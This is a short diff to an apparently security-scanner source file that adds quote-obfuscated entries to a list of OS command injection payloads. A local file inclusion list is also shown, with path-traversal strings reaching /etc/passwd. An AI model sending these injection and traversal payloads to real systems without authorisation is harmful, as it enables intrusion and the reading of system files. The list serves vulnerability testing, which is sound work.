@@ -230,7 +230,7 @@ OScommand=['& id', '&& id', '|| id', '&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt
 '|id;', '||/usr/bin/id;', ';id|', ';|/usr/bin/id|', '\\n/usr/bin/id\\n', '\\nid\\n',
 '\\n/usr/bin/id;', '\\nid;', '\\n/usr/bin/id|', '\\nid|', ';/usr/bin/id\\n', ';id\\n',
 '|usr/bin/id\\n', '|nid\\n', '`id`', '`/usr/bin/id`', 'a);id', 'a;id', 'a);id;', 'a;id;',
-'a);id|', 'a;id|', 'a)|id', 'a|id', 'a)|id;', 'a|id', 'a);/usr/bin/id', 'a;/usr/bin/id', 
+'a);id|', 'a;id|', 'a)|id', 'a|id', 'a)|id;', 'a|id', 'a);/usr/bin/id',"i'd'","a|i'd'","a||i'd'","&i'd'","&&i'd'", 'a;/usr/bin/id', 
 'a);/usr/bin/id;', 'a;/usr/bin/id;','X&cmd=id','X&command=id'
 ]
 LFI=['%00../../../../../../etc/passwd', '%00/etc/passwd%00', '%0a/bin/cat%20/etc/passwd',
